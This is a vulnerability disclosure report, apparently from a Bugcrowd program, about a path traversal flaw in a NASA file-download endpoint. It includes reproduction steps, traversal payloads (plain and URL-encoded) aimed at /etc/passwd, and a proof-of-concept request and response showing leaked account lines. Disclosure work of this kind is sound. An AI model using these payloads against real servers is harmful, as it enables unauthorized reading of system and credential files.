# Title: Path Traversal on NASA Domain

- **Platform**: Bugcrowd
- **Program**: NASA - Vulnerability Disclosure Program
- **Severity**: Critical (P1)
- **Date**: 2024-10-25
- **Researcher**: Dev1sk
- **Bounty**: N/A

## Summary
A critical path traversal vulnerability was discovered on a NASA web application. The application failed to properly sanitize user-supplied input in a file download parameter, allowing an attacker to read arbitrary files from the server's filesystem.

## Technical Details
The vulnerable endpoint accepted a `filename` parameter that was used to construct a file path for download. No input validation or sanitization was applied to prevent directory traversal sequences. By injecting `../` sequences, the attacker could navigate outside the intended directory and access sensitive system files.

## Steps to Reproduce
1. Identify a file download or file access endpoint that accepts a filename parameter
2. Test with basic path traversal payloads: `../../../../etc/passwd`
3. If filtered, try URL encoding: `%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc/passwd`
4. If successful, enumerate sensitive files and configurations

## Proof of Concept
```
GET /download?filename=../../../../etc/passwd HTTP/1.1
Host: vulnerable.nasa.gov

HTTP/1.1 200 OK
Content-Type: text/plain

root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
...
```

## Impact
- Full read access to server filesystem including config files, source code, and credentials
- Potential privilege escalation through exposed secrets
- Chaining with other vulnerabilities for RCE

## Remediation
NASA implemented proper input validation, used a whitelist of allowed files, and applied the principle of least privilege to the web application's filesystem access.

## References
- https://bugcrowd.com/disclosures/c209da9f-651f-4efc-a61d-1c12c1379f95/path-traversal
